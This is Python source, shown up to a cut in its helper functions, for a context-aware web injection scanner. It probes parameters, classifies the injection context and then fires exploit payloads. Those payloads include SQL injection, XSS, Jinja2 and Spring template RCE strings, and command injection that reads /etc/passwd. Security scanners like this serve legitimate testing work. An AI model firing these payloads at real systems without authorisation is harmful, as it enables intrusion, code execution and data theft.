r"""
BEATRIX Backslash-Powered Scanner

Inspired by James Kettle's "Backslash Powered Scanning" technique.

Instead of blindly spraying payloads at every parameter (which produces
massive false positive rates — see: every SmartFuzzer "SQLi" against
kick.com), this scanner first *probes how input is processed* and then
attacks only the confirmed context.

Architecture:
    ┌──────────────────────┐
    │ Phase 1: PROBE       │  Send diagnostic chars: \ " ' < > $ ` {{ %00
    │ Analyze transforms   │  → How does each character appear in the response?
    ├──────────────────────┤
    │ Phase 2: CLASSIFY    │  Determine injection context:
    │                      │  SQL string? HTML attr? JS string? Template? Shell?
    ├──────────────────────┤
    │ Phase 3: CONFIRM     │  Send context-specific confirmation payloads ONLY
    │                      │  (e.g. SQL context → '||'a'||' not XSS payloads)
    ├──────────────────────┤
    │ Phase 4: EXPLOIT     │  Send context-appropriate exploit payloads
    │                      │  and yield verified findings
    └──────────────────────┘

Key insight:  If ' is reflected as \\' → SQL context with addslashes.
              If < is reflected as &lt; → HTML entity encoding → no XSS.
              If {{ is reflected as the result of evaluation → SSTI.
              No need to waste 500 requests per parameter on irrelevant payloads.

Reference: https://portswigger.net/research/backslash-powered-scanning
CWE:       CWE-20 (Improper Input Validation)
"""

import asyncio
import hashlib
import logging
import re
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, AsyncIterator, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, quote, urlencode, urljoin, urlparse, urlunparse

from beatrix.core.types import Confidence, Finding, InsertionPoint, InsertionPointType, Severity
from .base import BaseScanner, ScanContext
from .insertion import InsertionPointDetector

logger = logging.getLogger("beatrix.scanners.backslash")


# =============================================================================
# INJECTION CONTEXT CLASSIFICATION
# =============================================================================

class InjectionContext(Enum):
    """Detected input processing contexts."""
    SQL_STRING_SINGLE = auto()   # Inside SQL single-quoted string
    SQL_STRING_DOUBLE = auto()   # Inside SQL double-quoted string
    SQL_NUMERIC = auto()         # In SQL numeric context (no quoting)
    HTML_TAG_BODY = auto()       # Between HTML tags
    HTML_ATTRIBUTE_QUOTED = auto()  # Inside a quoted HTML attribute
    HTML_ATTRIBUTE_UNQUOTED = auto()  # In unquoted HTML attribute
    JS_STRING_SINGLE = auto()    # Inside JS single-quoted string
    JS_STRING_DOUBLE = auto()    # Inside JS double-quoted string
    JS_TEMPLATE_LITERAL = auto() # Inside JS template literal (`...`)
    TEMPLATE_ENGINE = auto()     # Server-side template (Jinja2, Twig, etc.)
    SHELL_COMMAND = auto()       # OS command injection context
    URL_PATH = auto()            # Reflected in URL path/redirect
    URL_PARAMETER = auto()       # Reflected in another URL parameter
    HEADER_VALUE = auto()        # Reflected in response header
    JSON_VALUE = auto()          # Reflected inside JSON string
    XML_VALUE = auto()           # Reflected inside XML/CDATA
    NO_REFLECTION = auto()       # Input not reflected at all (blind only)
    FULLY_ENCODED = auto()       # All special chars encoded — hardened
    UNKNOWN = auto()             # Can't determine


@dataclass
class ProbeResult:
    """Result of sending a single probe character."""
    probe_char: str
    sent_value: str          # Full value sent (canary + probe)
    reflected: bool          # Was the canary found in response?
    transformed_value: str   # How the probe appeared in the response
    transformation: str      # Classification: 'verbatim', 'encoded', 'stripped', 
                             #   'doubled', 'escaped', 'error', 'missing'
    status_code: int = 0
    response_length: int = 0
    response_time_ms: float = 0.0
    in_header: bool = False  # Reflected in response header
    error_triggered: bool = False  # Caused a server error


@dataclass
class ContextClassification:
    """Full classification of a parameter's injection context."""
    parameter: str
    contexts: List[InjectionContext]
    primary_context: InjectionContext
    confidence: float  # 0.0 - 1.0
    probes: List[ProbeResult] = field(default_factory=list)
    transformations: Dict[str, str] = field(default_factory=dict)
    notes: List[str] = field(default_factory=list)


# =============================================================================
# PROBE CHARACTERS AND THEIR DIAGNOSTIC VALUE
# =============================================================================

# Each probe character reveals something about the processing context
PROBE_CHARS: List[Tuple[str, str]] = [
    ("\\",   "escape_char"),     # Triggers SQL/shell escape behavior
    ("'",    "single_quote"),    # SQL string delimiter, JS string delimiter
    ('"',    "double_quote"),    # SQL/HTML/JS string delimiter
    ("<",    "lt_bracket"),      # HTML tag opener
    (">",    "gt_bracket"),      # HTML tag closer
    ("{{",   "template_open"),   # Jinja2/Twig/Handlebars template syntax
    ("${",   "dollar_brace"),    # JS template literal, shell expansion
    ("`",    "backtick"),        # JS template literal, shell command sub
    ("|",    "pipe"),            # Shell pipe, SQL bitwise OR
    (";",    "semicolon"),       # SQL/shell statement separator
    ("%00",  "null_byte"),       # Null byte — path traversal, WAF bypass
    ("\n",   "newline"),         # Header injection, log injection
    ("<%",   "asp_tag"),         # ASP/JSP expression
]

# Confirmation payloads per context — sent ONLY when context is confirmed
CONTEXT_CONFIRMATIONS: Dict[InjectionContext, List[Tuple[str, str]]] = {
    InjectionContext.SQL_STRING_SINGLE: [
        ("'||'canary'||'", "string_concat_oracle"),
        ("' 'canary", "string_adjacency_mysql"),
        ("'+'canary'+'", "string_concat_mssql"),
    ],
    InjectionContext.SQL_STRING_DOUBLE: [
        ('"||"canary"||"', "dbl_concat_oracle"),
        ('" "canary', "dbl_adjacency_mysql"),
    ],
    InjectionContext.SQL_NUMERIC: [
        ("1 and 1=1", "bool_true"),
        ("1 and 1=2", "bool_false"),
    ],
    InjectionContext.HTML_TAG_BODY: [
        ("<b>canary</b>", "bold_inject"),
        ("<img src=x>", "img_inject"),
    ],
    InjectionContext.HTML_ATTRIBUTE_QUOTED: [
        ('" onmouseover="canary', "event_breakout_dbl"),
        ("' onmouseover='canary", "event_breakout_sgl"),
    ],
    InjectionContext.HTML_ATTRIBUTE_UNQUOTED: [
        (" onmouseover=canary", "event_inject"),
        ("><img src=x>", "tag_breakout"),
    ],
    InjectionContext.JS_STRING_SINGLE: [
        ("'-'canary'-'", "js_arith_breakout"),
        ("';var canary=1;//", "js_statement_inject"),
    ],
    InjectionContext.JS_STRING_DOUBLE: [
        ('"-"canary"-"', "js_dbl_arith_breakout"),
        ('";var canary=1;//', "js_dbl_statement_inject"),
    ],
    InjectionContext.TEMPLATE_ENGINE: [
        ("{{7*7}}", "ssti_multiply"),
        ("${7*7}", "ssti_dollar"),
        ("#{7*7}", "ssti_hash"),
        ("<%= 7*7 %>", "ssti_erb"),
    ],
    InjectionContext.SHELL_COMMAND: [
        ("|id", "pipe_id"),
        (";id", "semi_id"),
        ("$(id)", "dollar_subst"),
        ("`id`", "backtick_subst"),
    ],
}

# Exploit payloads per context — the actual ATTACK payloads
CONTEXT_EXPLOITS: Dict[InjectionContext, List[Dict[str, Any]]] = {
    InjectionContext.SQL_STRING_SINGLE: [
        {
            "payload": "' OR '1'='1",
            "name": "sqli_auth_bypass",
            "severity": Severity.CRITICAL,
            "cwe": "CWE-89",
            "detection": "behavior",
        },
        {
            "payload": "' UNION SELECT NULL--",
            "name": "sqli_union_probe",
            "severity": Severity.CRITICAL,
            "cwe": "CWE-89",
            "detection": "error",
        },
        {
            "payload": "' AND SLEEP(5)--",
            "name": "sqli_time_blind",
            "severity": Severity.CRITICAL,
            "cwe": "CWE-89",
            "detection": "time",
            "time_threshold": 4.5,
        },
    ],
    InjectionContext.SQL_STRING_DOUBLE: [
        {
            "payload": '" OR "1"="1',
            "name": "sqli_dbl_auth_bypass",
            "severity": Severity.CRITICAL,
            "cwe": "CWE-89",
            "detection": "behavior",
        },
    ],
    InjectionContext.SQL_NUMERIC: [
        {
            "payload": "1 OR 1=1",
            "name": "sqli_numeric_bypass",
            "severity": Severity.CRITICAL,
            "cwe": "CWE-89",
            "detection": "behavior",
        },
        {
            "payload": "1 AND SLEEP(5)",
            "name": "sqli_numeric_time",
            "severity": Severity.CRITICAL,
            "cwe": "CWE-89",
            "detection": "time",
            "time_threshold": 4.5,
        },
    ],
    InjectionContext.HTML_TAG_BODY: [
        {
            "payload": '<script>alert(document.domain)</script>',
            "name": "xss_script_inject",
            "severity": Severity.HIGH,
            "cwe": "CWE-79",
            "detection": "reflect",
        },
        {
            "payload": '<img src=x onerror=alert(document.domain)>',
            "name": "xss_img_onerror",
            "severity": Severity.HIGH,
            "cwe": "CWE-79",
            "detection": "reflect",
        },
    ],
    InjectionContext.HTML_ATTRIBUTE_QUOTED: [
        {
            "payload": '" onfocus="alert(document.domain)" autofocus="',
            "name": "xss_attr_breakout",
            "severity": Severity.HIGH,
            "cwe": "CWE-79",
            "detection": "reflect",
        },
    ],
    InjectionContext.HTML_ATTRIBUTE_UNQUOTED: [
        {
            "payload": ' onfocus=alert(document.domain) autofocus ',
            "name": "xss_unquoted_event",
            "severity": Severity.HIGH,
            "cwe": "CWE-79",
            "detection": "reflect",
        },
    ],
    InjectionContext.JS_STRING_SINGLE: [
        {
            "payload": "'-alert(document.domain)-'",
            "name": "xss_js_single_breakout",
            "severity": Severity.HIGH,
            "cwe": "CWE-79",
            "detection": "reflect",
        },
    ],
    InjectionContext.JS_STRING_DOUBLE: [
        {
            "payload": '"-alert(document.domain)-"',
            "name": "xss_js_double_breakout",
            "severity": Severity.HIGH,
            "cwe": "CWE-79",
            "detection": "reflect",
        },
    ],
    InjectionContext.TEMPLATE_ENGINE: [
        {
            "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "name": "ssti_jinja2_rce",
            "severity": Severity.CRITICAL,
            "cwe": "CWE-1336",
            "detection": "reflect",
        },
        {
            "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "name": "ssti_spring_rce",
            "severity": Severity.CRITICAL,
            "cwe": "CWE-1336",
            "detection": "reflect",
        },
    ],
    InjectionContext.SHELL_COMMAND: [
        {
            "payload": ";cat /etc/passwd",
            "name": "cmdi_etc_passwd",
            "severity": Severity.CRITICAL,
            "cwe": "CWE-78",
            "detection": "reflect",
            "patterns": [r"root:.*?:0:0:"],
        },
        {
            "payload": "$(cat /etc/passwd)",
            "name": "cmdi_subst_passwd",
            "severity": Severity.CRITICAL,
            "cwe": "CWE-78",
            "detection": "reflect",
            "patterns": [r"root:.*?:0:0:"],
        },
    ],
}


# =============================================================================
# SCANNER
# =============================================================================

class BackslashPoweredScanner(BaseScanner):
    """
    Context-aware injection scanner using James Kettle's backslash-powered
    scanning technique.

    Instead of throwing payloads blindly, this scanner:
    1. Probes how input is transformed (reflected, encoded, stripped, escaped)
    2. Classifies the injection context (SQL, HTML, JS, template, shell)
    3. Sends only context-appropriate payloads
    4. Verifies exploitation with confirmation payloads

    This eliminates the epidemic of false positives from generic fuzzing.
    """

    name = "backslash"
    description = "Backslash-powered context-aware injection scanner"
    version = "1.0.0"
    checks = ["sqli", "xss", "cmdi", "ssti", "context_analysis"]
    owasp_category = "A03:2021"
    mitre_technique = "T1190"  # Exploit Public-Facing Application

    def __init__(self, config=None):
        super().__init__(config)
        self.insertion_detector = InsertionPointDetector(config)
        self._canary_counter = 0
        # Cap probing to avoid hammering
        self.max_params_per_url = self.config.get("max_params", 20)
        self.max_urls = self.config.get("max_urls", 30)
        # Time-based detection threshold
        self.time_threshold = self.config.get("time_threshold", 4.5)

    # ─────────────────────────────────────────────────────────────────────
    # CANARY GENERATION
    # ─────────────────────────────────────────────────────────────────────

    def _generate_canary(self) -> str:
        """Generate a unique canary string unlikely to appear naturally."""
        self._canary_counter += 1
        raw = f"bxc{self._canary_counter}{time.time_ns() % 99999}"
        return f"bxc{hashlib.md5(raw.encode()).hexdigest()[:8]}"

    # ─────────────────────────────────────────────────────────────────────
    # PHASE 1: PROBING
    # ─────────────────────────────────────────────────────────────────────

    async def _send_probe(
        self,
        url: str,
        param_name: str,
        param_value: str,
        probe_char: str,
        canary: str,
        method: str = "GET",
    ) -> ProbeResult:
        """Send a single probe character and analyze how it's transformed."""
        # Build the probe value: canary + probe char + canary
        # The canaries let us find exactly where the probe landed
        probe_value = f"{canary}{probe_char}{canary}"

        # Inject into the URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param_name] = [probe_value]
        new_query = urlencode(params, doseq=True)
        probe_url = urlunparse(parsed._replace(query=new_query))

        start = time.monotonic()
        try:
            if method.upper() == "GET":
                resp = await self.get(probe_url)
            else:
                # For POST, send as form body
                body_params = dict(params)
                body_params[param_name] = [probe_value]
                resp = await self.post(
                    urlunparse(parsed._replace(query="")),
                    data={k: v[0] for k, v in body_params.items()},
                )
            elapsed_ms = (time.monotonic() - start) * 1000
        except Exception:
            return ProbeResult(
                probe_char=probe_char,
                sent_value=probe_value,
                reflected=False,
                transformed_value="",
                transformation="error",
                error_triggered=True,
            )

        body = resp.text
        status = resp.status_code
        elapsed_ms = (time.monotonic() - start) * 1000

        # Check if reflected in response headers
        in_header = False
        header_str = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        if canary in header_str:
            in_header = True

        # Determine how the probe char was transformed
        reflected = canary in body or canary in header_str
        transformation = "missing"
        transformed_value = ""

        if reflected:
            # Find the canary pair and extract what's between them
            search_body = body if canary in body else header_str
            pattern = re.escape(canary) + r"(.*?)" + re.escape(canary)
            match = re.search(pattern, search_body, re.DOTALL)

            if match:
                transformed_value = match.group(1)
                transformation = self._classify_transformation(
                    probe_char, transformed_value
                )
            else:
                # Canary found but not as a pair — partial reflection
                transformation = "partial"

        # Check if the probe caused a server error
        error_triggered = status >= 500

        return ProbeResult(
            probe_char=probe_char,
            sent_value=probe_value,
            reflected=reflected,
            transformed_value=transformed_value,
            transformation=transformation,
            status_code=status,
            response_length=len(body),
            response_time_ms=elapsed_ms,
            in_header=in_header,
            error_triggered=error_triggered,
        )

    def _classify_transformation(self, original: str, transformed: str) -> str:
        """Classify how a probe character was transformed."""
        if transformed == original:
            return "verbatim"  # Passed through unchanged

        if not transformed:
            return "stripped"  # Completely removed

        # HTML entity encoding
        html_entities = {
            "<": ("&lt;", "&#60;", "&#x3c;"),
            ">": ("&gt;", "&#62;", "&#x3e;"),
            '"': ("&quot;", "&#34;", "&#x22;"),
            "'": ("&#39;", "&#x27;", "&apos;"),
            "&": ("&amp;", "&#38;"),
        }
        if original in html_entities:
            if transformed.lower() in (e.lower() for e in html_entities[original]):
                return "html_encoded"

        # URL encoding
        url_encoded = quote(original, safe="")
        if transformed == url_encoded or transformed == url_encoded.lower():
            return "url_encoded"

        # Backslash escaping (SQL/JS): ' → \'  or  ' → ''
        if transformed == f"\\{original}":
            return "backslash_escaped"
        if original in ("'", '"') and transformed == original * 2:
            return "doubled"

        # Unicode escaping: < → \u003c
        unicode_map = {
            "<": "\\u003c", ">": "\\u003e",
            "'": "\\u0027", '"': "\\u0022",
            "&": "\\u0026",
        }
        if original in unicode_map and transformed.lower() == unicode_map[original]:
            return "unicode_escaped"

        # Partial match — probe char is present but modified
        if original in transformed:
            return "partially_transformed"

        return "custom_encoded"

    async def _probe_parameter(
        self,
        url: str,
        param_name: str,
        param_value: str,
        method: str = "GET",
    ) -> List[ProbeResult]:
        """Send all probe characters to a single parameter."""
        canary = self._generate_canary()
        probes = []

        for probe_char, _label in PROBE_CHARS:
            result = await self._send_probe(
                url, param_name, param_value, probe_char, canary, method
            )
            probes.append(result)

            # Small delay to avoid rate limiting
            await asyncio.sleep(0.05)

        return probes

    # ─────────────────────────────────────────────────────────────────────
    # PHASE 2: CONTEXT CLASSIFICATION
    # ─────────────────────────────────────────────────────────────────────

    def _classify_context(
        self, param_name: str, probes: List[ProbeResult]
    ) -> ContextClassification:
        """Analyze probe results to determine the injection context."""
        transformations = {}
        for p in probes:
            transformations[p.probe_char] = p.transformation

        contexts: List[InjectionContext] = []
        notes: List[str] = []

        # Check if anything reflects at all
        any_reflected = any(p.reflected for p in probes)
        any_in_header = any(p.in_header for p in probes)
        any_error = any(p.error_triggered for p in probes)

        if not any_reflected and not any_error:
            return ContextClassification(
                parameter=param_name,
                contexts=[InjectionContext.NO_REFLECTION],
                primary_context=InjectionContext.NO_REFLECTION,
                confidence=0.8,
                probes=probes,
                transformations=transformations,
                notes=["Input not reflected — blind-only testing needed"],
            )

        # ── SQL detection ─────────────────────────────────────────────
        sq = transformations.get("'", "missing")
        dq = transformations.get('"', "missing")
        bs = transformations.get("\\", "missing")
        semi = transformations.get(";", "missing")

        # Single quote causes error but double quote doesn't → SQL single-quoted
        sq_probe = next((p for p in probes if p.probe_char == "'"), None)
        dq_probe = next((p for p in probes if p.probe_char == '"'), None)

        if sq_probe and sq_probe.error_triggered and dq_probe and not dq_probe.error_triggered:
            contexts.append(InjectionContext.SQL_STRING_SINGLE)
            notes.append("Single quote triggers error, double quote doesn't → SQL single-quoted string")

        if dq_probe and dq_probe.error_triggered and sq_probe and not sq_probe.error_triggered:
            contexts.append(InjectionContext.SQL_STRING_DOUBLE)
            notes.append("Double quote triggers error → SQL double-quoted string")

        # Backslash escaping of quotes → SQL with addslashes/magic_quotes
        if sq == "backslash_escaped" or sq == "doubled":
            contexts.append(InjectionContext.SQL_STRING_SINGLE)
            notes.append(f"Quote escaped as {sq} — SQL context with escaping")

        # ── HTML detection ────────────────────────────────────────────
        lt = transformations.get("<", "missing")
        gt = transformations.get(">", "missing")

        if lt == "verbatim" and gt == "verbatim":
            # < and > pass through unchanged — HTML injection possible
            if sq == "verbatim" or dq == "verbatim":
                contexts.append(InjectionContext.HTML_TAG_BODY)
                notes.append("< > and quotes pass through verbatim → HTML tag body injection")
            else:
                contexts.append(InjectionContext.HTML_TAG_BODY)
                notes.append("HTML brackets pass through → tag injection possible")

        if lt == "html_encoded" and gt == "html_encoded":
            # Tags are encoded but quotes might not be
            if dq == "verbatim":
                contexts.append(InjectionContext.HTML_ATTRIBUTE_QUOTED)
                notes.append("Brackets encoded, double quote verbatim → HTML attribute breakout")
            elif sq == "verbatim":
                contexts.append(InjectionContext.HTML_ATTRIBUTE_QUOTED)
                notes.append("Brackets encoded, single quote verbatim → HTML attribute breakout")

        # ── JavaScript detection ──────────────────────────────────────
        backtick = transformations.get("`", "missing")
        dollar_brace = transformations.get("${", "missing")

        if sq == "backslash_escaped" and lt == "verbatim":
            contexts.append(InjectionContext.JS_STRING_SINGLE)
            notes.append("Single quote backslash-escaped, brackets verbatim → JS string context")

        if dq == "backslash_escaped" and lt == "verbatim":
            contexts.append(InjectionContext.JS_STRING_DOUBLE)
            notes.append("Double quote backslash-escaped, brackets verbatim → JS string context")

        if backtick == "verbatim" and dollar_brace == "verbatim":
            contexts.append(InjectionContext.JS_TEMPLATE_LITERAL)
            notes.append("Backtick and ${ pass through → JS template literal injection")

        # ── Template Engine detection ─────────────────────────────────
        template = transformations.get("{{", "missing")
        dollar = transformations.get("${", "missing")

        # Check if {{7*7}} actually computed to 49
        template_probe = next((p for p in probes if p.probe_char == "{{"), None)
        if template_probe and template_probe.reflected:
            if "49" in template_probe.transformed_value:
                contexts.append(InjectionContext.TEMPLATE_ENGINE)
                notes.append("Template expression evaluated — SSTI confirmed")
            elif template == "verbatim":
                # {{ passed through but wasn't eval'd — might still be SSTI
                # in a different template syntax
                notes.append("{{ passed through verbatim — check alternative template syntaxes")

        if dollar == "verbatim":
            # ${ passed through — could be SSTI with ${} syntax
            dollar_probe = next((p for p in probes if p.probe_char == "${"), None)
            if dollar_probe and "49" in (dollar_probe.transformed_value or ""):
                contexts.append(InjectionContext.TEMPLATE_ENGINE)
                notes.append("${} expression evaluated — SSTI confirmed")

        # ── Shell Injection detection ─────────────────────────────────
        pipe = transformations.get("|", "missing")

        if pipe == "verbatim" and semi == "verbatim" and backtick == "verbatim":
            contexts.append(InjectionContext.SHELL_COMMAND)
            notes.append("Shell metacharacters pass through — possible command injection")

        # ── Header injection ──────────────────────────────────────────
        if any_in_header:
            contexts.append(InjectionContext.HEADER_VALUE)
            notes.append("Input reflected in response headers — possible header injection")

        # ── Newline in header → CRLF injection ────────────────────────
        newline_probe = next((p for p in probes if p.probe_char == "\n"), None)
        if newline_probe and newline_probe.in_header:
            contexts.append(InjectionContext.HEADER_VALUE)
            notes.append("Newline reflected in header — CRLF injection possible")

        # ── Fully encoded (hardened) ──────────────────────────────────
        all_encoded = all(
            t in ("html_encoded", "url_encoded", "unicode_escaped", "stripped", "missing")
            for t in transformations.values()
        )
        if all_encoded and not any_error:
            return ContextClassification(
                parameter=param_name,
                contexts=[InjectionContext.FULLY_ENCODED],
                primary_context=InjectionContext.FULLY_ENCODED,
                confidence=0.9,
                probes=probes,
                transformations=transformations,
                notes=["All special characters are encoded/stripped — input is hardened"],
            )

        # ── Determine primary context ─────────────────────────────────
        if not contexts:
            primary = InjectionContext.UNKNOWN
            confidence = 0.3
        else:
            # Priority: SQL > SSTI > Shell > JS > HTML (by severity)
            priority_order = [
                InjectionContext.SQL_STRING_SINGLE,
                InjectionContext.SQL_STRING_DOUBLE,
                InjectionContext.SQL_NUMERIC,
                InjectionContext.TEMPLATE_ENGINE,
                InjectionContext.SHELL_COMMAND,
                InjectionContext.JS_STRING_SINGLE,
                InjectionContext.JS_STRING_DOUBLE,
                InjectionContext.JS_TEMPLATE_LITERAL,
                InjectionContext.HTML_TAG_BODY,
                InjectionContext.HTML_ATTRIBUTE_QUOTED,
                InjectionContext.HTML_ATTRIBUTE_UNQUOTED,
                InjectionContext.HEADER_VALUE,
            ]
            primary = InjectionContext.UNKNOWN
            for ctx in priority_order:
                if ctx in contexts:
                    primary = ctx
                    break
            if primary == InjectionContext.UNKNOWN and contexts:
                primary = contexts[0]
            confidence = min(0.5 + 0.15 * len(contexts), 0.95)

        return ContextClassification(
            parameter=param_name,
            contexts=contexts,
            primary_context=primary,
            confidence=confidence,
            probes=probes,
            transformations=transformations,
            notes=notes,
        )

    # ─────────────────────────────────────────────────────────────────────
    # PHASE 3 & 4: CONFIRMATION AND EXPLOITATION
    # ─────────────────────────────────────────────────────────────────────

    async def _confirm_and_exploit(
        self,
        url: str,
        param_name: str,
        param_value: str,
        classification: ContextClassification,
        method: str = "GET",
    ) -> AsyncIterator[Finding]:
        """Send context-specific confirmation and exploit payloads."""
        for ctx in classification.contexts:
            # Phase 3: Confirmation — verify the context classification
            confirmations = CONTEXT_CONFIRMATIONS.get(ctx, [])
            confirmed = False

            for confirm_payload, confirm_name in confirmations:
                canary = self._generate_canary()
                # Replace 'canary' in payload with our actual canary
                actual_payload = confirm_payload.replace("canary", canary)

                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param_name] = [actual_payload]
                new_query = urlencode(params, doseq=True)
                confirm_url = urlunparse(parsed._replace(query=new_query))

                try:
                    start = time.monotonic()
                    resp = await self.get(confirm_url)
                    elapsed = (time.monotonic() - start) * 1000

                    body = resp.text

                    # For SQL confirmations: check if canary appears (concat worked)
                    if "concat" in confirm_name or "adjacency" in confirm_name:
                        if canary in body:
                            confirmed = True
                            break
                    # For HTML confirmations: check if tags rendered
                    elif "inject" in confirm_name:
                        if "<b>" in body or "<img" in body:
                            confirmed = True
                            break
                    # For SSTI confirmations: check if math evaluated
                    elif "ssti" in confirm_name:
                        if "49" in body:
                            confirmed = True
                            break
                    # For boolean SQL: compare true vs false response
                    elif "bool_true" in confirm_name:
                        # We need to also send the false version
                        pass  # Handled below

                except Exception:
                    continue

                await asyncio.sleep(0.05)

            # Phase 4: Exploitation — send actual attack payloads
            exploits = CONTEXT_EXPLOITS.get(ctx, [])
            for exploit in exploits:
                payload = exploit["payload"]
                detection = exploit.get("detection", "reflect")

                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param_name] = [payload]
                new_query = urlencode(params, doseq=True)
                exploit_url = urlunparse(parsed._replace(query=new_query))

                try:
                    start = time.monotonic()
                    if method.upper() == "GET":
                        resp = await self.get(exploit_url)
                    else:
                        resp = await self.post(
                            urlunparse(parsed._replace(query="")),
                            data={param_name: payload},
                        )
                    elapsed_ms = (time.monotonic() - start) * 1000
                except Exception:
                    continue

                body = resp.text
                vuln_detected = False
                evidence_detail = ""

                # Detection methods
                if detection == "reflect":
                    # Check if the payload (or key parts) appear in response
                    check_patterns = exploit.get("patterns", [])
                    if check_patterns:
                        for pat in check_patterns:
                            if re.search(pat, body, re.IGNORECASE):
                                vuln_detected = True
                                evidence_detail = f"Pattern matched: {pat}"
                                break
                    else:
                        # For XSS: check if dangerous payload fragments are in response
                        dangerous_parts = [
                            "alert(document.domain)",
                            "onerror=alert",
                            "onfocus=alert",
                            "onmouseover=alert",
                            "<script>",
                        ]
                        for part in dangerous_parts:
                            if part in body:
                                vuln_detected = True
                                evidence_detail = f"Payload fragment reflected: {part}"
                                break

                elif detection == "error":
                    # SQL error patterns
                    error_patterns = [
                        r"SQL syntax", r"mysql_", r"ORA-\d{5}",
                        r"PostgreSQL.*?ERROR", r"SQLITE_ERROR",
                        r"Unclosed quotation", r"unterminated",
                    ]
                    for pat in error_patterns:
                        if re.search(pat, body, re.IGNORECASE):
                            vuln_detected = True
                            evidence_detail = f"SQL error pattern: {pat}"
                            break

                elif detection == "time":
                    threshold = exploit.get("time_threshold", self.time_threshold)
                    if elapsed_ms > threshold * 1000:
                        vuln_detected = True
                        evidence_detail = f"Response delayed {elapsed_ms:.0f}ms (threshold: {threshold*1000:.0f}ms)"

                elif detection == "behavior":
                    # Need to compare with baseline — send benign value
                    try:
                        params_benign = parse_qs(parsed.query, keep_blank_values=True)
                        params_benign[param_name] = [param_value or "test"]
                        benign_url = urlunparse(parsed._replace(
                            query=urlencode(params_benign, doseq=True)
                        ))
                        baseline_resp = await self.get(benign_url)

                        # Import response analyzer for comparison
                        try:
                            from beatrix.core.response_analyzer import (
                                is_blind_indicator,
                                responses_differ,
                            )
                            diffs = responses_differ(
                                baseline_resp.status_code,
                                dict(baseline_resp.headers),
                                baseline_resp.text,
                                resp.status_code,
                                dict(resp.headers),
                                body,
                            )
                            if is_blind_indicator(diffs, min_attrs=2):
                                vuln_detected = True
                                diff_attrs = ", ".join(a.name for a in diffs.keys())
                                evidence_detail = f"Behavioral diff detected: {diff_attrs}"
                        except ImportError:
                            # Fallback: simple status + length comparison
                            if (baseline_resp.status_code != resp.status_code or
                                    abs(len(baseline_resp.text) - len(body)) > 100):
                                vuln_detected = True
                                evidence_detail = (
                                    f"Status {baseline_resp.status_code}→{resp.status_code}, "
                                    f"Length {len(baseline_resp.text)}→{len(body)}"
                                )
                    except Exception:
                        pass

                if vuln_detected:
                    confidence_level = Confidence.FIRM if confirmed else Confidence.TENTATIVE
                    ctx_name = ctx.name.replace("_", " ").title()

                    yield self.create_finding(
                        title=f"Backslash Scanner: {exploit['name']} in {param_name} ({ctx_name})",
                        severity=exploit["severity"],
                        confidence=confidence_level,
                        url=url,
                        description=(
                            f"Context-aware injection detected in parameter '{param_name}'.\n\n"
                            f"**Injection Context:** {ctx_name}\n"
                            f"**Context Confidence:** {classification.confidence:.0%}\n"
                            f"**Context Evidence:** {'; '.join(classification.notes)}\n\n"
                            f"**Transformations observed:**\n"
                            + "\n".join(
                                f"  - `{char}` → {trans}"
                                for char, trans in classification.transformations.items()
                                if trans not in ("missing",)
                            )
                            + f"\n\n**Detection:** {evidence_detail}"
                        ),
                        evidence=evidence_detail,
                        parameter=param_name,
                        payload=payload,
                        cwe_id=exploit.get("cwe"),
                        impact=self._impact_for_context(ctx),
                        remediation=self._remediation_for_context(ctx),
                        references=self._references_for_context(ctx),
                        request=self.format_http_request(resp),
                        response=self.format_http_response(resp),
                        poc_curl=self._build_poc_curl(exploit_url, method),
                        reproduction_steps=[
                            f"1. Navigate to {url}",
                            f"2. Set parameter '{param_name}' to: {payload}",
                            f"3. Observe: {evidence_detail}",
                        ],
                    )

                await asyncio.sleep(0.05)

    # ─────────────────────────────────────────────────────────────────────
    # MAIN SCAN ENTRY POINT
    # ─────────────────────────────────────────────────────────────────────

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Main entry point — probe, classify, and exploit injectable parameters.
        """
        url = context.url
        urls_to_test = [url]

        # If crawl data is available, also test discovered URLs with parameters
        if context.extra.get("urls_with_params"):
            extra_urls = list(context.extra["urls_with_params"])[:self.max_urls]
            urls_to_test.extend(u for u in extra_urls if u != url)

        # Deduplicate by (host, path, param_names) to avoid testing the same
        # endpoint shape multiple times
        seen_shapes = set()

        for test_url in urls_to_test[:self.max_urls]:
            parsed = urlparse(test_url)
            params = parse_qs(parsed.query, keep_blank_values=True)

            if not params:
                continue

            # Shape dedup: same path + same parameter names = same test
            param_names = tuple(sorted(params.keys()))
            shape = (parsed.netloc, parsed.path, param_names)
            if shape in seen_shapes:
                continue
            seen_shapes.add(shape)

            # Probe each parameter
            tested = 0
            for param_name, values in params.items():
                if tested >= self.max_params_per_url:
                    break

                param_value = values[0] if values else ""
                tested += 1

                logger.info(f"Probing {param_name} at {parsed.path}")

                # Phase 1 & 2: Probe and classify
                probes = await self._probe_parameter(
                    test_url, param_name, param_value
                )
                classification = self._classify_context(param_name, probes)

                # Skip if parameter is hardened or not reflected
                if classification.primary_context in (
                    InjectionContext.FULLY_ENCODED,
                    InjectionContext.NO_REFLECTION,
                ):
                    logger.info(
                        f"  {param_name}: {classification.primary_context.name} — skipping"
                    )
                    continue

                if classification.primary_context == InjectionContext.UNKNOWN:
                    logger.info(
                        f"  {param_name}: UNKNOWN context — skipping"
                    )
                    continue

                logger.info(
                    f"  {param_name}: {classification.primary_context.name} "
                    f"(confidence: {classification.confidence:.0%})"
                )

                # Phase 3 & 4: Confirm and exploit
                async for finding in self._confirm_and_exploit(
                    test_url, param_name, param_value, classification
                ):
                    yield finding

    # ─────────────────────────────────────────────────────────────────────
    # HELPERS
    # ─────────────────────────────────────────────────────────────────────

    def _build_poc_curl(self, url: str, method: str = "GET") -> str:
        """Build a curl PoC command."""
        if method.upper() == "GET":
            return f"curl -sk '{url}'"
        return f"curl -sk -X {method} '{url}'"

    @staticmethod
    def _impact_for_context(ctx: InjectionContext) -> str:
        impacts = {
            InjectionContext.SQL_STRING_SINGLE: (
